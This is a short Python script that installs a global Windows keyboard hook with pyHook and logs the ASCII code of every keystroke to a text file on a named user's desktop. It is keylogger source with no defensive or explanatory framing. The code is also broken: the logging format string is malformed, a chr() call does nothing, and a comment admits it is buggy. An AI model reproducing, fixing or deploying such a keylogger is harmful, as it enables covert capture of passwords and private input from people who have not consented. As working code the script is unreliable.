import pyHook, pythoncom, sys, logging

file_log = r'C:\Users\Benjamin Pollak\Desktop\loggo.txt'

def OnKeyboardEvent(event):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)')
	chr(event.Ascii)
	logging.log(10, str(event.Ascii)) # TODO: im buggy
	return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
